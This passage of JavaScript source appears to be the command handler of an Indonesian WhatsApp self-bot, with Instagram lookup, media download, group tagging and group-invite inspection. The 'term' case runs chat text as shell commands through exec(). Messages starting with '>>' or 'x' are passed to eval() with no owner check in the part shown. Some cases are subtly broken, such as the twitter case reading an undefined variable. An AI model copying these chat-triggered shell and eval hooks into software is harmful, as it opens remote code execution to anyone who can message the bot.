                    let link = await getBuffer(i.url)
                    hexa.sendMessage(from,link,image,{quoted: mek,caption: `Type : ${i.type}`})                  
                }
            }
            });
	    break
    case 'igstalk':
            if (!q) return fakegroup('Usernamenya?')
            ig.fetchUser(`${args.join(' ')}`).then(Y => {
            console.log(`${args.join(' ')}`)
            ten = `${Y.profile_pic_url_hd}`
            teks = `*ID* : ${Y.profile_id}\n*Username* : ${args.join('')}\n*Full Name* : ${Y.full_name}\n*Bio* : ${Y.biography}\n*Followers* : ${Y.followers}\n*Following* : ${Y.following}\n*Private* : ${Y.is_private}\n*Verified* : ${Y.is_verified}\n\n*Link* : https://instagram.com/${args.join('')}`
            sendMediaURL(from,ten,teks) 
            })      
            break    
    case 'fb':
            if (!q) return reply('Linknya?')
            if (!isUrl(args[0]) && !args[0].includes('facebook.com')) return reply(mess.Iv)
            reply(mess.wait)
            te = args.join(' ')
            hx.fbdown(`${te}`)
            .then(G => {
            ten = `${G.HD}`
            sendMediaURL(from,ten,`*Link video_normal* : ${G.Normal_video}`)
            })
            break    
	case 'term':
			if (!q) return fakegroup(mess.wrongFormat)
			exec(q, (err, stdout) => {
			if (err) return fakegroup(`SELF-BOT:~ ${err}`)
			if (stdout) {
			fakegroup(stdout)
			}
			})
		    break 
    case 'join':
            try {
            if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return reply(mess.Iv)
            hen = args[0]
            if (!q) return fakestatus('Masukan link group')
            var codeInvite = hen.split('https://chat.whatsapp.com/')[1]
            if (!codeInvite) return fakegroup ('pastikan link sudah benar!')
            var response = await hexa.acceptInvite(codeInvite)
            fakestatus('SUKSES')
            } catch {
            fakegroup('LINK ERROR!')
            }
            break
    case'twitter':
            if (!isUrl(args[0]) && !args[0].includes('twitter.com')) return reply(mess.Iv)
            if (!q) return fakegroup('Linknya?')
            ten = args[0]
            var res = await hx.twitter(`${ten}`)
            ren = `${g.HD}`
            sendMediaURL(from,ren,'DONE')
            break
    case 'runtime':
    case 'test':
            run = process.uptime() 
            teks = `${kyun(run)}`
            fakegroup(teks)
            break  
	case 'speed':
	case 'ping':
			const timestamp = speed();
			const latensi = speed() - timestamp
			exec(`neofetch --stdout`, (error, stdout, stderr) => {
			const child = stdout.toString('utf-8')
			const teks = child.replace(/Memory:/, "Ram:")
			const pingnya = `*${teks}Speed: ${latensi.toFixed(4)} Second*`
			fakegroup(pingnya)
			})
			break  
    case 'totag':
            if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
            encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await hexa.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await hexa.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            hexa.sendMessage(from, ini_buffer, sticker, options)
            fs.unlinkSync(file)
            } else if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
            encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await hexa.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await hexa.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            hexa.sendMessage(from, ini_buffer, image, options)
            fs.unlinkSync(file)
        } else if ((isMedia && !mek.message.videoMessage || isQuotedAudio) && args.length == 0) {
            encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await hexa.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await hexa.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                mimetype : 'audio/mp4',
                ptt : true,
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            hexa.sendMessage(from, ini_buffer, audio, options)
            fs.unlinkSync(file)
        }  else if ((isMedia && !mek.message.videoMessage || isQuotedVideo) && args.length == 0) {
            encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await hexa.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await hexa.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                mimetype : 'video/mp4',
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            hexa.sendMessage(from, ini_buffer, video, options)
            fs.unlinkSync(file)
        } else{
          reply(`reply gambar/sticker/audio/video dengan caption ${prefix}totag`)
        }
        break
    case 'tomp4':
            if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
            ger = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            owgi = await hexa.downloadAndSaveMediaMessage(ger)
            webp2mp4File(owgi).then(res=>{
            sendMediaURL(from,res.result,'Done')
            })
            }else {
            reply('reply stiker')
            }
            fs.unlinkSync(owgi)
            break
    case 'tourl':
            if ((isMedia && !mek.message.videoMessage || isQuotedImage || isQuotedVideo ) && args.length == 0) {
            boij = isQuotedImage || isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
            owgi = await hexa.downloadMediaMessage(boij)
            res = await upload(owgi)
            reply(res)
            } else {
            reply('kirim/reply gambar/video')
            }
            break	
    case 'inspect':
            try {
            if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return reply(mess.Iv)
            if (!q) return reply('masukan link wa')
            cos = args[0]
            var net = cos.split('https://chat.whatsapp.com/')[1]
            if (!net) return reply('pastikan itu link https://whatsapp.com/')
            jids = []
            let { id, owner, subject, subjectOwner, desc, descId, participants, size, descOwner, descTime, creation} = await hexa.query({ 
            json: ["query", "invite",net],
            expect200:true })
            let par = `*Id* : ${id}
${owner ? `*Owner* : @${owner.split('@')[0]}` : '*Owner* : -'}
*Nama Gc* : ${subject}
*Gc dibuat Tanggal* : ${formatDate(creation * 1000)}
*Jumlah Member* : ${size}
${desc ? `*Desc* : ${desc}` : '*Desc* : tidak ada'}
*Id desc* : ${descId}
${descOwner ? `*Desc diubah oleh* : @${descOwner.split('@')[0]}` : '*Desc diubah oleh* : -'}\n*Tanggal* : ${descTime ? `${formatDate(descTime * 1000)}` : '-'}\n\n*Kontak yang tersimpan*\n`
           for ( let y of participants) {
             par += `> @${y.id.split('@')[0]}\n*Admin* : ${y.isAdmin ? 'Ya' : 'Tidak'}\n`
             jids.push(`${y.id.replace(/@c.us/g,'@s.whatsapp.net')}`)
             }
             jids.push(`${owner ? `${owner.replace(/@c.us/g,'@s.whatsapp.net')}` : '-'}`)
             jids.push(`${descOwner ? `${descOwner.replace(/@c.us/g,'@s.whatsapp.net')}` : '-'}`)
             hexa.sendMessage(from,par,text,{quoted:mek,contextInfo:{mentionedJid:jids}})
             } catch {
             reply('Link error')
             }
             break
default:
if (budy.includes('dimje')) {
const gojomp3 = fs.readFileSync('./lib/dj.mp3');
hexa.sendMessage(from, gojomp3, MessageType.audio, {quoted: ftroli, mimetype: 'audio/mp4', ptt:true})
}
if (body.startsWith('>>')) {
	try {
		evaled = await eval(q)
		if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
		reply(String(evaled))
	} catch (e) {
		console.log(e)
		reply(String(e))
	}
} else if (budy.startsWith('x')){
try {
return reply(JSON.stringify(eval(q),null,'\t'))
} catch(err) {
reply(String(err))
}
}  

	}
if (isGroup && budy != undefined) {
	} else {
	console.log(color('[TEXT]', 'red'), 'SELF-MODE', color(sender.split('@')[0]))
	}		
	} catch (e) {
    e = String(e)
    if (!e.includes("this.isZero") && !e.includes("jid")) {
	console.log('Message : %s', color(e, 'green'))
        }
	// console.log(e)
	}
}


	
    
